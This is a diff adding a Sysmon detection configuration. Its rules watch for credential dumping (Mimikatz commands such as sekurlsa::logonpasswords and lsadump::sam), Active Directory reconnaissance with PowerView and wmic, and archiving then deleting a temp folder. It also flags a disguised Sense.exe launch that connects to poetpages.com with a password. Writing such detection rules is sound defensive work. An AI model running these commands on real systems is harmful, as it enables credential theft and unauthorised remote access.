@@ -1,0 +1,50 @@
+<Sysmon schemaversion="10.4">
+
+    <HashAlgorithms>md5,sha256</HashAlgorithms>
+
+    <EventFiltering>
+
+		<ProcessCreate onmatch="include">
+			<Image condition="contains">ntoskrnl.exe</Image>
+			<Image condition="contains">rr.exe</Image>
+		</ProcessCreate>
+
+		<ImageLoad onmatch="include">
+			<ImageLoaded condition="contains">AclNumsInvertHost.dll</ImageLoaded>
+		</ImageLoad>
+
+		<RegistryEvent onmatch="include">
+			<TargetObject condition="contains">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa</TargetObject>
+			<TargetObject condition="contains">HKLM\SYSTEM</TargetObject>
+			<TargetObject condition="contains">HKLM\SAM</TargetObject>
+			<TargetObject condition="contains">HKLM\SECURITY</TargetObject>
+		</RegistryEvent>
+
+		<ProcessCreate onmatch="include">
+			<CommandLine condition="contains">whoami</CommandLine>
+			<CommandLine condition="contains">nltest</CommandLine>
+			<CommandLine condition="contains">wmic /node</CommandLine>
+			<CommandLine condition="contains">wmic process</CommandLine>
+			<CommandLine condition="contains">powershell ([adsisearcher]"((samaccountname=<redacted>))").Findall().Properties</CommandLine>
+			<CommandLine condition="contains">powershell Get-WmiObject -Class Win32_Service -Computername</CommandLine>
+			<CommandLine condition="contains">powershell Get-WindowsDriver -Online -All</CommandLine>
+			<CommandLine condition="contains">privilege::debug</CommandLine>
+			<CommandLine condition="contains">lsadump::cache</CommandLine>
+			<CommandLine condition="contains">lsadump::secrets</CommandLine>
+			<CommandLine condition="contains">lsadump::sam</CommandLine>
+			<CommandLine condition="contains">sekurlsa::logonpasswords</CommandLine>
+			<CommandLine condition="contains">powershell Compress-Archive -Path C:\Windows\temp\1\ -DestinationPath C:\Windows\temp\s.zip -Force & del C:\Windows\temp\1 /F /Q</CommandLine>
+			<CommandLine condition="contains">Get-NetGroup</CommandLine>
+			<CommandLine condition="contains">Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount"</CommandLine>
+			<CommandLine condition="contains">Get-NetDiDomain</CommandLine>
+			<CommandLine condition="contains">Get-AdUser</CommandLine>
+			<CommandLine condition="contains">Get-DomainUser -UserName</CommandLine>
+			<CommandLine condition="contains">Get-NetUser -PreauthNotRequire</CommandLine>
+			<CommandLine condition="contains">Get-NetComputer | select samaccountname</CommandLine>
+			<CommandLine condition="contains">Get-NetUser -SPN | select serviceprincipalname</CommandLine>
+			<CommandLine condition="contains">wmic process call create "C:\Program Files\Windows Defender Advanced Threat Protection\Sense.exe -connect poetpages.com -pass M554-0sddsf2@34232fsl45t31"</CommandLine>
+		</ProcessCreate>
+
+    </EventFiltering>
+
+</Sysmon>
